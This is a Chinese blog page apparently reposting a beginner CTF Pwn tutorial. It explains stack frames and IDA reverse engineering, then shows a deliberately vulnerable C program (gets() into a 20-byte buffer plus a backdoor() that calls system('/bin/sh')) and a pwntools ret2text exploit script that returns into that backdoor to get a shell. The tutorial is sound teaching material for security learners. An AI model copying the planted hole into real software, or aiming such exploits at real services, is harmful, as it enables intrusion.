<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="Pwn从入门到入狱Copyright © 2020 arttnba3,XDSEC 简介：什么是Pwn？Pwn这个词本身其实是一个拟声词，最初来源于黑客们设想中的完全获取一台设备的控制权后便会发出“砰”的一声，Pwn因此而得名，即利用挖掘到的二进制漏洞对设备或系统发起攻击，并最终拿到shell（获取控制权） Pwn也是最能代表原教旨主义黑客的一个安全研究方向同时也是最容易进监狱的一个方向 预备知识作">
<meta property="og:type" content="article">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/2021/06/10/Pwn1/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="Pwn从入门到入狱Copyright © 2020 arttnba3,XDSEC 简介：什么是Pwn？Pwn这个词本身其实是一个拟声词，最初来源于黑客们设想中的完全获取一台设备的控制权后便会发出“砰”的一声，Pwn因此而得名，即利用挖掘到的二进制漏洞对设备或系统发起攻击，并最终拿到shell（获取控制权） Pwn也是最能代表原教旨主义黑客的一个安全研究方向同时也是最容易进监狱的一个方向 预备知识作">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://i.loli.net/2020/09/19/VrEYoaTgXHztuek.png">
<meta property="og:image" content="https://i.loli.net/2020/09/19/3V8ZP2kTlwjBArp.png">
<meta property="og:image" content="https://i.loli.net/2020/09/10/ImU7JcHr9j5DOS8.png">
<meta property="og:image" content="https://i.loli.net/2020/09/19/PnyOMxVuwl2HkAp.png">
<meta property="og:image" content="https://i.loli.net/2020/09/19/X9EqLPcvoRU7apQ.png">
<meta property="og:image" content="https://i.loli.net/2020/09/19/fi49QwLhvb8jBKp.png">
<meta property="og:image" content="https://i.loli.net/2020/09/10/PKn45uGFCiALw9s.png">
<meta property="og:image" content="https://i.loli.net/2020/09/10/H3pmFvzSZjVbR9A.png">
<meta property="og:image" content="https://i.loli.net/2020/09/08/U7P6A1HlfkZGsXi.png">
<meta property="og:image" content="https://i.loli.net/2020/09/10/rpSL6osNhMKiY9u.png">
<meta property="og:image" content="https://i.loli.net/2020/09/19/1A5cH3GkKp6uYsb.png">
<meta property="og:image" content="https://i.loli.net/2020/09/10/7SCLieKoarEXu5m.png">
<meta property="og:image" content="https://i.loli.net/2020/09/10/re1Z5dROXLE8PHp.png">
<meta property="og:image" content="https://i.loli.net/2020/09/10/EPZ2iyr5UnQsgex.png">
<meta property="og:image" content="https://i.loli.net/2020/09/10/nM84Expy1KVLGc6.png">
<meta property="og:image" content="https://i.loli.net/2020/09/10/6Nt9GE1BWZ5ij2R.png">
<meta property="og:image" content="https://i.loli.net/2020/09/10/wg6HRpMc9mLdaBU.png">
<meta property="og:image" content="https://i.loli.net/2020/09/19/gaKMp2WFLs8coRJ.png">
<meta property="og:image" content="c:/Users/lenovo/AppData/Roaming/Typora/typora-user-images/image-20201206145503600.png">
<meta property="og:image" content="c:/Users/lenovo/AppData/Roaming/Typora/typora-user-images/image-20201211091110573.png">
<meta property="og:image" content="c:/Users/lenovo/AppData/Roaming/Typora/typora-user-images/image-20201223203046179.png">
<meta property="og:image" content="c:/Users/lenovo/AppData/Roaming/Typora/typora-user-images/image-20210419213222530.png">
<meta property="og:image" content="c:/Users/lenovo/AppData/Roaming/Typora/typora-user-images/image-20210419213339346.png">
<meta property="og:image" content="c:/Users/lenovo/AppData/Roaming/Typora/typora-user-images/image-20210419214339319.png">
<meta property="og:image" content="c:/Users/lenovo/AppData/Roaming/Typora/typora-user-images/image-20210506203252016.png">
<meta property="og:image" content="c:/Users/lenovo/AppData/Roaming/Typora/typora-user-images/image-20210601170711924.png">
<meta property="og:image" content="c:/Users/lenovo/AppData/Roaming/Typora/typora-user-images/image-20210408203206050.png">
<meta property="og:image" content="c:/Users/lenovo/AppData/Roaming/Typora/typora-user-images/image-20201217195700784.png">
<meta property="og:image" content="c:/Users/lenovo/AppData/Roaming/Typora/typora-user-images/image-20201217202453262.png">
<meta property="og:image" content="c:/Users/lenovo/AppData/Roaming/Typora/typora-user-images/image-20201226105958044.png">
<meta property="og:image" content="c:/Users/lenovo/AppData/Roaming/Typora/typora-user-images/image-20210425190724564.png">
<meta property="og:image" content="c:/Users/lenovo/AppData/Roaming/Typora/typora-user-images/image-20210425192952079.png">
<meta property="og:image" content="c:/Users/lenovo/AppData/Roaming/Typora/typora-user-images/image-20210425195608057.png">
<meta property="og:image" content="c:/Users/lenovo/AppData/Roaming/Typora/typora-user-images/image-20210428170006717.png">
<meta property="og:image" content="c:/Users/lenovo/AppData/Roaming/Typora/typora-user-images/image-20210415212139462.png">
<meta property="og:image" content="c:/Users/lenovo/AppData/Roaming/Typora/typora-user-images/image-20210415212236480.png">
<meta property="og:image" content="c:/Users/lenovo/AppData/Roaming/Typora/typora-user-images/image-20210415212253520.png">
<meta property="og:image" content="c:/Users/lenovo/AppData/Roaming/Typora/typora-user-images/image-20210426182256010.png">
<meta property="og:image" content="c:/Users/lenovo/AppData/Roaming/Typora/typora-user-images/image-20210426182914323.png">
<meta property="og:image" content="c:/Users/lenovo/AppData/Roaming/Typora/typora-user-images/image-20210426183936404.png">
<meta property="og:image" content="c:/Users/lenovo/AppData/Roaming/Typora/typora-user-images/image-20210426210509846.png">
<meta property="og:image" content="c:/Users/lenovo/AppData/Roaming/Typora/typora-user-images/image-20210421154310013.png">
<meta property="og:image" content="c:/Users/lenovo/AppData/Roaming/Typora/typora-user-images/image-20210405152335132.png">
<meta property="og:image" content="c:/Users/lenovo/AppData/Roaming/Typora/typora-user-images/image-20210406222444981.png">
<meta property="og:image" content="c:/Users/lenovo/AppData/Roaming/Typora/typora-user-images/image-20210406222701397.png">
<meta property="og:image" content="c:/Users/lenovo/AppData/Roaming/Typora/typora-user-images/image-20210403135405470.png">
<meta property="og:image" content="c:/Users/lenovo/AppData/Roaming/Typora/typora-user-images/image-20210403135758688.png">
<meta property="og:image" content="c:/Users/lenovo/AppData/Roaming/Typora/typora-user-images/image-20210507211456199.png">
<meta property="og:image" content="c:/Users/lenovo/AppData/Roaming/Typora/typora-user-images/image-20210404194833329.png">
<meta property="og:image" content="c:/Users/lenovo/AppData/Roaming/Typora/typora-user-images/image-20210408202832093.png">
<meta property="og:image" content="c:/Users/lenovo/AppData/Roaming/Typora/typora-user-images/image-20210408210619611.png">
<meta property="og:image" content="c:/Users/lenovo/AppData/Roaming/Typora/typora-user-images/image-20210409170956236.png">
<meta property="og:image" content="d:/qq/2293245197/FileRecv/MobileFile/20200430183408568.png">
<meta property="og:image" content="c:/Users/lenovo/AppData/Roaming/Typora/typora-user-images/image-20210421180339718.png">
<meta property="og:image" content="c:/Users/lenovo/AppData/Roaming/Typora/typora-user-images/image-20210421180408843.png">
<meta property="og:image" content="c:/Users/lenovo/AppData/Roaming/Typora/typora-user-images/image-20210528181156959.png">
<meta property="article:published_time" content="2021-06-10T11:49:52.217Z">
<meta property="article:modified_time" content="2021-06-03T08:13:53.730Z">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://i.loli.net/2020/09/19/VrEYoaTgXHztuek.png">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
<meta name="generator" content="Hexo 5.4.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main"><article id="post-Pwn1" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/06/10/Pwn1/" class="article-date">
  <time class="dt-published" datetime="2021-06-10T11:49:52.217Z" itemprop="datePublished">2021-06-10</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="Pwn从入门到入狱"><a href="#Pwn从入门到入狱" class="headerlink" title="Pwn从入门到入狱"></a>Pwn从入门到入狱</h1><p>Copyright © 2020 arttnba3,XDSEC</p>
<h2 id="简介：什么是Pwn？"><a href="#简介：什么是Pwn？" class="headerlink" title="简介：什么是Pwn？"></a>简介：什么是Pwn？</h2><p><strong>Pwn</strong>这个词本身其实是一个拟声词，最初来源于黑客们设想中的完全获取一台设备的控制权后便会发出“砰”的一声，Pwn因此而得名，即<strong>利用挖掘到的二进制漏洞对设备或系统发起攻击，并最终拿到shell（获取控制权）</strong></p>
<p>Pwn也是最能代表<strong>原教旨主义黑客</strong>的一个安全研究方向<del>同时也是最容易进监狱的一个方向</del></p>
<h2 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h2><p>作为二进制安全的分支之一，Pwn需要你<strong>熟练掌握</strong>如下基础知识：</p>
<ul>
<li><strong>主流平台汇编语言，包括但不局限于X86、MIPS等</strong></li>
<li><strong>C语言</strong></li>
<li><strong>计算机组成原理</strong></li>
<li><strong>计算机操作系统</strong></li>
<li><strong>静态分析（IDA）&amp;动态调试（GDB）</strong></li>
<li><strong>Python</strong></li>
<li><strong>编译原理</strong></li>
<li><strong>……</strong></li>
</ul>
<p>看完你可能会感觉有一丶丶头大，不过少有人是先把计科专业本科的内容全部学完才开始学pwn的，大家都是<strong>一边比赛一边学习的</strong>，所以不用担心因为自己0基础导致无法入门的情况的发生</p>
<blockquote>
<p>CTF TO LEARN, NOT LEARN TO CTF</p>
</blockquote>
<h2 id="Pwn的解题过程？"><a href="#Pwn的解题过程？" class="headerlink" title="Pwn的解题过程？"></a>Pwn的解题过程？</h2><ol>
<li>题目的二进制文件一般会被部署到服务器上，使用<code>nc xx.xx.xx.xx(ip) xxxx(端口)</code>命令可以与服务器进行交互。并且该二进制文件的副本（与服务器上的完全相同或者基本相同）将作为附件形式被提供给选手下载。</li>
<li>你需要逆向分析二进制文件副本中存在的可利用漏洞，针对其编写<code>Exploit</code>(漏洞利用脚本)，然后向服务器发起攻击，拿到服务器上保存的<code>flag文件或字符串</code>，将其提交至本平台。</li>
<li>注意命令行中的<code>nc</code>并不是做题工具，你需要在Linux下安装<code>pwntools</code>库（或者其它），用于编写可用性较高的<code>Exploit</code>。至于如何安装，如何使用，就需要聪明的你发挥自己的学习能力啦~</li>
</ol>
<h2 id="0基础入门：新人的第一个安全漏洞的利用——栈溢出——ret2text"><a href="#0基础入门：新人的第一个安全漏洞的利用——栈溢出——ret2text" class="headerlink" title="0基础入门：新人的第一个安全漏洞的利用——栈溢出——ret2text"></a>0基础入门：新人的第一个安全漏洞的利用——栈溢出——ret2text</h2><blockquote>
<h4 id="前置知识要求："><a href="#前置知识要求：" class="headerlink" title="前置知识要求："></a>前置知识要求：</h4><ul>
<li>C语言基本语法</li>
<li>Python语言基本语法</li>
</ul>
<p>能大致看得懂C程序、有写简单的Python程序的能力即可</p>
<h4 id="前置环境要求："><a href="#前置环境要求：" class="headerlink" title="前置环境要求："></a>前置环境要求：</h4><ul>
<li><p>Windows</p>
</li>
<li><p>Linux</p>
</li>
</ul>
<p>我们的一部分工作需要在Windows上完成，另一部份工作则需要在Linux中完成</p>
<p>你可以在windows上运行Linux虚拟机，也可以直接在真机运行linux</p>
<p>注：linux环境下由于默认的远程软件库是国外的源，下载速度可能会比较慢</p>
<h4 id="百度“Linux-换源”与“pip-换源”更换Linux下的软件源为国内的软件源，提高下载速度"><a href="#百度“Linux-换源”与“pip-换源”更换Linux下的软件源为国内的软件源，提高下载速度" class="headerlink" title="百度“Linux 换源”与“pip 换源”更换Linux下的软件源为国内的软件源，提高下载速度"></a>百度“Linux 换源”与“pip 换源”更换Linux下的软件源为国内的软件源，提高下载速度</h4><h4 id="不同的Linux发行版本（如Ubuntu、Kali、manjaro等）请自行将搜索框内的“linux”换为对应的发行版名称"><a href="#不同的Linux发行版本（如Ubuntu、Kali、manjaro等）请自行将搜索框内的“linux”换为对应的发行版名称" class="headerlink" title="不同的Linux发行版本（如Ubuntu、Kali、manjaro等）请自行将搜索框内的“linux”换为对应的发行版名称"></a>不同的Linux发行版本（如Ubuntu、Kali、manjaro等）请自行将搜索框内的“linux”换为对应的发行版名称</h4></blockquote>
<p>以下内容将通过几个样例简单地帮助你入门Pwn</p>
<h3 id="以下内容操作环境位于Linux："><a href="#以下内容操作环境位于Linux：" class="headerlink" title="以下内容操作环境位于Linux："></a>以下内容操作环境位于Linux：</h3><p>我们现在来看这样的一个程序：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">backdoor</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> str[<span class="number">20</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;tell me your name plz:&quot;</span>);</span><br><span class="line">    <span class="built_in">gets</span>(str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">func</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们使用<code>-fno-stack-protector</code>、<code>-z norelro</code>、<code>-z execstack</code>、<code>-no-pie</code>这四条编译指令把这个程序的保护都给关掉</p>
<p><img src="https://i.loli.net/2020/09/19/VrEYoaTgXHztuek.png" alt="image.png"></p>
<h4 id="安全检查：checksec"><a href="#安全检查：checksec" class="headerlink" title="安全检查：checksec"></a>安全检查：checksec</h4><p><strong>使用<code>checksec</code>指令可以查看程序的保护开启情况</strong></p>
<p><img src="https://i.loli.net/2020/09/19/3V8ZP2kTlwjBArp.png" alt="image.png"></p>
<p>可以在控制台输入如下指令安装：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo apt install checksec</span></span><br></pre></td></tr></table></figure>

<h4 id="逻辑分析"><a href="#逻辑分析" class="headerlink" title="逻辑分析"></a>逻辑分析</h4><p>这个程序做了些什么？</p>
<ul>
<li><p>定义了一个后门函数<code>backdoor()</code>，但是并未调用</p>
</li>
<li><p>分配了20个字节大小的内存空间给到char类型数组str</p>
</li>
<li><p>使用<code>gets()</code>函数从标准输入流读入字符串并写入数组str内</p>
</li>
</ul>
<p>我们可以看到当我们在编译时编译器<strong>给了一个警告</strong>，这是因为<strong>gets()函数并未限制读入的字符的数量，若是用户输入超过20个字符的数据，则会发生栈溢出，轻则会使程序崩溃，重则可能让不法分子获取系统的最高权限</strong></p>
<p>我们尝试着输入超过20个字节的字符串，看看会发生些什么：</p>
<p><img src="https://i.loli.net/2020/09/10/ImU7JcHr9j5DOS8.png" alt="image.png"></p>
<p>程序崩溃，提示<strong>Segmentation fault</strong>（<strong>段错误</strong>），即<strong>该程序尝试访问了不属于他的内存空间</strong></p>
<p>但是我们的程序执行流程明明很常规，代码里也没有任何的奇怪的操作，<strong>为什么输入不一样就会导致程序崩溃呢？</strong></p>
<h3 id="以下内容操作环境位于Windows："><a href="#以下内容操作环境位于Windows：" class="headerlink" title="以下内容操作环境位于Windows："></a>以下内容操作环境位于Windows：</h3><h4 id="IDA：逆向分析"><a href="#IDA：逆向分析" class="headerlink" title="IDA：逆向分析"></a>IDA：逆向分析</h4><p>通常情况下，我们所拿到的都是软件的发行版，而不是源代码，我们无法直接看出漏洞存在于哪个地方，故我们需要一个工具来尽可能地还原整个程序的运行过程，这就要借助到一个工具——<strong>IDA</strong></p>
<p>我们尝试使用<strong>IDA</strong>对程序进行<strong>逆向分析</strong></p>
<blockquote>
<p>注：IDA软件本体在moeCTF 2020群内有下载，你也可以选择通过搜索引擎获取一个IDA，或者直接在官网购买正版IDA</p>
</blockquote>
<p>当我们将程序拖入IDA后，除了我们自己写的<code>backdoor()</code>函数、<code>func()</code>函数及<code>main()</code>函数之外，我们可以看到IDA还解析出来很多奇奇怪怪的函数，</p>
<p><img src="https://i.loli.net/2020/09/19/PnyOMxVuwl2HkAp.png" alt="image.png"></p>
<p>这些预料之外的函数我们目前暂时不需要管（以后会学到的），我们目前只需要分析程序的主逻辑函数即可，双击main函数，我们便可以看到反汇编得到的汇编代码</p>
<p><img src="https://i.loli.net/2020/09/19/X9EqLPcvoRU7apQ.png" alt="image.png"></p>
<p>同样地，双击func函数我们也可以看到其原始的汇编代码</p>
<p><img src="https://i.loli.net/2020/09/19/fi49QwLhvb8jBKp.png" alt="image.png"></p>
<blockquote>
<h3 id="F5键：使用IDA进行逆向分析的神器"><a href="#F5键：使用IDA进行逆向分析的神器" class="headerlink" title="F5键：使用IDA进行逆向分析的神器"></a>F5键：使用IDA进行逆向分析的神器</h3><p>当我们选中一个函数时，我们可以按下F5键，将汇编代码反编译为C语言的代码，使我们能够更好的分析程序执行流程</p>
<p><img src="https://i.loli.net/2020/09/10/PKn45uGFCiALw9s.png" alt="image.png"></p>
<p>要注意的是<strong>不要完全依赖于F5键进行逆向分析，反编译出来的C语言代码不一定准确、易读，汇编代码的审计与程序的动态调试同样重要</strong></p>
<p>如：纯汇编编写的程序反编译出来的代码不知所云的情况常常出现</p>
<p><img src="https://i.loli.net/2020/09/10/H3pmFvzSZjVbR9A.png" alt="image.png"></p>
<p>如：C++程序很多时候逆出来就是一坨shit，没有强大的代码功底你很难搞明白程序究竟做了些什么，如下图（注释是我以前做这道题的时候手动打上的，可能有错，别深究Or2）</p>
<p><img src="https://i.loli.net/2020/09/08/U7P6A1HlfkZGsXi.png" alt="image.png"></p>
</blockquote>
<p>push是什么？mov是什么？retn又是什么？他们都做了些什么？或许目前对于你而言这是完全陌生的一些东西，不过随着逐步深入的学习，你将会逐渐了解到其含义与作用</p>
<h3 id="以下内容操作环境位于Linux：-1"><a href="#以下内容操作环境位于Linux：-1" class="headerlink" title="以下内容操作环境位于Linux："></a>以下内容操作环境位于Linux：</h3><h4 id="栈帧"><a href="#栈帧" class="headerlink" title="栈帧"></a>栈帧</h4><p>为什么这个程序的汇编代码长这个样子？这就涉及到C函数调用的一个比较重要的概念——<strong>栈帧</strong>（<strong>Stack Frame</strong>）</p>
<blockquote>
<p>推荐阅读——《程序员的自我修养》第10章</p>
</blockquote>
<blockquote>
<p> 在讲栈帧之前，我们先简单地讲一讲什么是<strong>栈</strong></p>
<p>在数据结构中，<strong>栈</strong>（<strong>stack</strong>）是一种受限线性表，在线性表上插入与删除数据的操作都只能在数据表的一端——栈顶进行操作，因此栈也是一种LIFO表（Last-in-First-out）</p>
<p>在操作系统中，对动态内存的规划与使用是与数据结构中的栈相似的，我们称之为“栈内存”，用以存储函数内部（包括main函数）的局部变量和方法调用和函数参数值；栈内存是由系统自动分配的，一般速度较快；存储地址是连续且存在有限栈容量，会出现溢出现象程序可以将数据压入栈中，也可以将数据从栈顶弹出。压栈操作使得栈增大，而弹出操作使栈减小。 栈用于维护函数调用的上下文，离开了栈函数调用就没法实现。</p>
</blockquote>
<p>当程序每次进行函数调用的时候，都会在调用栈上维护一个独立的<strong>栈帧</strong>，用以储存属于这个函数的数据与基本信息，包括如下信息：</p>
<ul>
<li><strong>函数的返回地址和参数</strong></li>
<li><strong>临时变量: 包括函数的非静态局部变量以及编译器自动生成的其他临时变量</strong></li>
</ul>
<p>想象如下一个空的栈：</p>
<p><strong>需要注意的是：在内存当中，栈是由高地址向低地址方向增长的</strong></p>
<p><img src="https://i.loli.net/2020/09/10/rpSL6osNhMKiY9u.png" alt="64E3FCC73EF02703BA8C857A91F96838.png"></p>
<p>这里引入一个新的概念——<strong>栈指针寄存器SP</strong>（<strong>Stack Pointer</strong>）与<strong>帧指针寄存器BP</strong>（<strong>Frame Pointer</strong>），这两个寄存器用以管理栈帧，其中<strong>SP寄存器永远指向栈顶，BP寄存器用以进行对栈内数据的访问</strong></p>
<p>当我们要调用一个函数时，首先会先<strong>将下一条的地址压入栈中，作为返回地址，这一步在原函数内完成</strong>，当函数执行流程结束后，程序会通过这个返回地址返回到该函数的上一层的调用地址</p>
<p>我们还是以刚刚反汇编出来的代码进行分析：</p>
<p>右键菜单可以切换到文本模式，也可以切换回图标格式，文本模式方便我们得以一窥程序原貌，图标模式则方便我们理解函数内的逻辑</p>
<p><img src="https://i.loli.net/2020/09/19/1A5cH3GkKp6uYsb.png" alt="image.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000040055A ; Attributes: bp-based frame</span><br><span class="line">.text:000000000040055A</span><br><span class="line">.text:000000000040055A                 public func</span><br><span class="line">.text:000000000040055A func            proc near               ; CODE XREF: main+4↓p</span><br><span class="line">.text:000000000040055A</span><br><span class="line">.text:000000000040055A var_20          = byte ptr -20h</span><br><span class="line">.text:000000000040055A</span><br><span class="line">.text:000000000040055A ; __unwind &#123;</span><br><span class="line">.text:000000000040055A                 push    rbp</span><br><span class="line">.text:000000000040055B                 mov     rbp, rsp</span><br><span class="line">.text:000000000040055E                 sub     rsp, 20h</span><br><span class="line">.text:0000000000400562                 lea     rdi, s          ; &quot;tell me your name plz&quot;</span><br><span class="line">.text:0000000000400569                 call    _puts</span><br><span class="line">.text:000000000040056E                 lea     rax, [rbp+var_20]</span><br><span class="line">.text:0000000000400572                 mov     rdi, rax</span><br><span class="line">.text:0000000000400575                 mov     eax, 0</span><br><span class="line">.text:000000000040057A                 call    _gets</span><br><span class="line">.text:000000000040057F                 nop</span><br><span class="line">.text:0000000000400580                 leave</span><br><span class="line">.text:0000000000400581                 retn</span><br><span class="line">.text:0000000000400581 ; &#125; // starts at 40055A</span><br><span class="line">.text:0000000000400581 func            endp</span><br></pre></td></tr></table></figure>



<p><img src="https://i.loli.net/2020/09/10/7SCLieKoarEXu5m.png" alt="52DF40089C8FCCF9D5CF8DE7211B73D8.png"></p>
<p>接下来就来到了我们看到的前两行汇编代码：<code>push rbp</code>与<code>mov rbp, rsp</code>，我们不难从指令的英文释义上知道其流程：</p>
<ul>
<li><strong>将bp寄存器的值压入栈中</strong></li>
<li><strong>将sp寄存器的值赋给bp寄存器</strong></li>
</ul>
<p><img src="https://i.loli.net/2020/09/10/re1Z5dROXLE8PHp.png" alt="9CF0F7F5A8DA1972F88EF480E4FB6271.png"></p>
<p>接下来的<code>sub rsp, 20h</code>指令的作用是<strong>开辟栈空间</strong>，处在sp与bp之间的这一块区域便用于储存数据</p>
<p><img src="https://i.loli.net/2020/09/10/EPZ2iyr5UnQsgex.png" alt="A422C008B65723152D16FDDAD8421B38.png"></p>
<p>我们的<code>char str[20];</code>所占用的空间也在这里，同时我们可以发现我们<strong>虽然只分配了20个字节给str，但是程序却开辟了0x20个字节的数据，这是因为程序还要储存一些其他的数据</strong>（以后会学到）</p>
<p><img src="https://i.loli.net/2020/09/10/nM84Expy1KVLGc6.png" alt="227643CB6A805274DA147132CC0413DE.png"></p>
<p>那么接下来就进入到我们对<code>gets()</code>函数的漏洞的利用过程了，由于其不限制我们输入的字符串的长度，我们可以<strong>将返回地址前面的数据全部填充</strong>（<strong>padding</strong>）<strong>掉，并将返回地址覆写为别的地址，改变程序的执行流程</strong></p>
<p><img src="https://i.loli.net/2020/09/10/6Nt9GE1BWZ5ij2R.png" alt="AF0BBCCF20D852033C201460B566F5DA.png"></p>
<p>我们最终的目的是<strong>获取到shell</strong>，那么只要程序当中存在着<code>system(&quot;/bin/sh&quot;)</code>的函数调用，我们再将程序返回到其地址上，即可get shell</p>
<p>构造payload如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>) + p64(sys_addr)		<span class="comment"># 别忘了8字节的rbp哟</span></span><br></pre></td></tr></table></figure>



<p>我们之前在程序当中写了一个<code>backdoor()</code>函数，其中包含有能够getshell的语句，同时我们在IDA中可以看到其地址为<code>0x400547</code></p>
<p><img src="https://i.loli.net/2020/09/10/wg6HRpMc9mLdaBU.png" alt="image.png"></p>
<h4 id="攻击神器：pwntools"><a href="#攻击神器：pwntools" class="headerlink" title="攻击神器：pwntools"></a>攻击神器：pwntools</h4><p>接下来我们就需要考虑到如何将我们所构思出来的payload给输入到程序中了，那么这里我们就要用到一个对于每一位Pwner都十分重要的python库——<strong>pwntools</strong></p>
<blockquote>
<p>pwntools需要在<strong>Linux</strong>系统下使用（如Ubuntu、manjaro、kali等）</p>
<p>在shell中输入如下指令安装pwntools</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo pip install pwntools</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>使用pwntools库我们可以很方便地输入相应的payload</p>
<p>接下来我们就该开始构造我们用以get shell的脚本了，利用pwntools库，构造exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *				<span class="comment"># 从pwntools库中导入所需要的一切</span></span><br><span class="line">p = process(<span class="string">&#x27;./test&#x27;</span>)			<span class="comment"># 运行一个程序</span></span><br><span class="line">								<span class="comment"># 需要注意的是，在连接远程服务器的时候，使用的是remote()</span></span><br><span class="line">    							<span class="comment"># p = remote(addr,port)</span></span><br><span class="line">        						<span class="comment"># 如：p = remote(&#x27;sec.arttnba3.cn&#x27;,10001)</span></span><br><span class="line">p.recv()						<span class="comment"># 从程序中读取输入直到下一个断点（如遇到输入语句）</span></span><br><span class="line">sys_addr = p64(<span class="number">0x400547</span>)		<span class="comment"># 将地址构造为符合小端模式的bytes数组，长度为8</span></span><br><span class="line">								<span class="comment"># 需要注意的是在32位下应当使用p32()，长度为4</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x28</span> + sys_addr	<span class="comment"># 构造我们的payload</span></span><br><span class="line">p.sendline(payload)				<span class="comment"># 向程序发送我们的输入</span></span><br><span class="line">								<span class="comment"># 需要注意的是，sendline()会在末尾添加换行符&#x27;\n&#x27;</span></span><br><span class="line">    							<span class="comment"># 若不想要发送多余的换行符，可以使用send()方法</span></span><br><span class="line">p.interactive()					<span class="comment"># 程序进入interactive模式，即进入我们与程序直接交互的界面</span></span><br></pre></td></tr></table></figure>

<p><strong>成功get shell</strong></p>
<p><img src="https://i.loli.net/2020/09/19/gaKMp2WFLs8coRJ.png" alt="image.png"></p>
